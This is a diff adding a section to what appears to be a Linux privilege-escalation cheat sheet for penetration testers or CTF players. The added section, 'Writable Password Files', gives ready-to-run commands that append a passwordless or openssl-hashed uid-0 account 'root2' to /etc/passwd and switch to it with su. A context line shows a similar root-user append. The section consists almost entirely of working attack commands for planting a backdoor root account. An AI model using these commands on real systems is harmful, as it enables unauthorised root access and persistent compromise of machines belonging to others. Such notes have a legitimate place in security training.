@@ -330,6 +330,31 @@ echo "user:$(openssl passwd password123):0:0:root:/root:/usr/bin/bash" >> /etc/p
 find / -writable -type d 2>/dev/null
 ```
 
+### Writable Password Files
+-> If you have write permission on this files
+```bash
+/etc/passwd
+/etc/shadow
+/etc/sudoers
+```
+
+-> passwd file
+```bash
+echo 'root2::0:0::/root:/bin/bash' >> /etc/passwd
+su - root2
+id && whoami
+```
+or 
+```
+openssl passwd -1 -salt mysalt NewP@ssword1
+Copy output
+echo "root2:<output>:0:0:root:/root:/bin/bash" >> /etc/passwd
+Replace <output> with the copied output
+su root2
+id && whoami
+```
+
+
 ### NFS Root Squashing
 -> Detection - VM Owned
 ```bash
